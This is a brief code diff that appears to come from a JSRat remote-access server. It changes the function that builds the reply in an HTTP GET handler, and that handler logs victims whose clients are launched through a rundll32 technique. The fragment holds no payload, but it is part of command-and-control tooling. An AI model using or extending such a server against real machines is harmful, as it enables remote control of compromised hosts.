@@ -304,7 +304,7 @@ class SendCMDHandler(BaseHTTPRequestHandler):
         Handle any GET requests coming into our server
     """
     content_type = "text/plain"
-    response_message = jsratCMD()
+    response_message = jsrat()
     if self.js_load_path == self.path:
       # invoked via rrundll32 method
       good("Incoming JSRat rundll32 Invoked Client: %s" % str(self.client_address[0]));
